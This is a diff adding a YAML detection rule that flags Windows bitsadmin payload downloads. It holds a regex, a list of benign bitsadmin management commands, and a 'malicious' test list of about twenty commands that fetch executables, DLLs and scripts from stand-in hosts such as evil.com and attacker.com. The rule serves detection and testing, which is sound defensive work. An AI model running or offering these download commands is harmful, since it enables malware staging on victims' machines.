@@ -1,0 +1,48 @@
+name: high-08-bitsadmin
+severity: high
+description: >
+  Detects bitsadmin downloading files from URLs. Windows background transfer utility abused for payload downloads.
+  Detection includes various flag orderings, spacing variations, and both uppercase and lowercase syntax.
+
+pattern: |
+  (?i)bitsadmin(?:\.exe)?[\s\r\n]+(?:[^\r\n]*?/(?:transfer|download|addfile)[\s\r\n]+[^\r\n]*?(?:http://|https://|ftp://)|/transfer[\s\r\n]+[^\r\n]*?(?:http://|https://|ftp://))
+
+malicious:
+  - "bitsadmin /transfer job http://evil.com/malware.exe C:\\malware.exe"
+  - "bitsadmin.exe /transfer download https://attacker.com/payload.dll payload.dll"
+  - "BITSADMIN /TRANSFER myJob /DOWNLOAD /PRIORITY HIGH http://evil.com/backdoor.exe backdoor.exe"
+  - "bitsadmin /transfer dl http://malware.com/trojan.exe C:\\Temp\\trojan.exe"
+  - "bitsadmin.exe /transfer downloadJob ftp://evil.com/dropper.exe dropper.exe"
+  - "bitsadmin /transfer job1 http://bad.com/evil.dll C:\\Windows\\Temp\\evil.dll"
+  - 'bitsadmin.exe /transfer "My Job" https://attacker.com/clickfix.exe clickfix.exe'
+  - "bitsadmin /transfer test http://evil.com/payload.exe C:\\Users\\Public\\payload.exe"
+  - "bitsadmin.exe /transfer jobName /download /priority foreground http://malware.com/mal.exe mal.exe"
+  - "bitsadmin /transfer download http://evil.com/backdoor.dll backdoor.dll"
+  - "bitsadmin.exe /transfer ransomware https://attacker.com/encrypt.exe C:\\Temp\\encrypt.exe"
+  - "bitsadmin /transfer implant /priority normal http://evil.com/implant.dll implant.dll"
+  - "cmd /c bitsadmin /transfer mal http://192.168.1.100/malware.bin C:\\malware.bin"
+  - "bitsadmin.exe /transfer \"Update Job\" ftp://malware.com/update.exe C:\\Users\\victim\\update.exe"
+  - "bitsadmin /transfer stage2 https://evil.com/stage2.ps1 C:\\Windows\\Temp\\stage2.ps1"
+  - "bitsadmin.exe /transfer /download /priority high http://attacker.com/loader.exe loader.exe"
+  - "bitsadmin /transfer clickfix http://evil.com/clickfix-installer.msi C:\\Temp\\installer.msi"
+  - "bitsadmin.exe /transfer backdoor /priority foreground https://malware.com/backdoor.exe backdoor.exe"
+  - "bitsadmin /transfer \"System Update\" http://evil.com/fake-update.exe C:\\ProgramData\\update.exe"
+  - "bitsadmin.exe /addfile myJob http://evil.com/malware.dll C:\\malware.dll"
+
+benign:
+  - "bitsadmin /list"
+  - "bitsadmin /info jobName"
+  - "bitsadmin.exe /reset"
+  - "bitsadmin /complete jobName"
+  - "bitsadmin /cancel jobName"
+  - "bitsadmin.exe /geterror"
+  - "bitsadmin /help"
+  - "bitsadmin.exe /monitor"
+  - "bitsadmin /list /verbose"
+  - "bitsadmin.exe /gettype jobName"
+  - "bitsadmin /suspend jobName"
+  - "bitsadmin.exe /resume jobName"
+  - "bitsadmin /setpriority jobName foreground"
+  - "bitsadmin.exe /getstate jobName"
+  - "bitsadmin /listfiles jobName"
+  - "bitsadmin.exe /rawreturn"
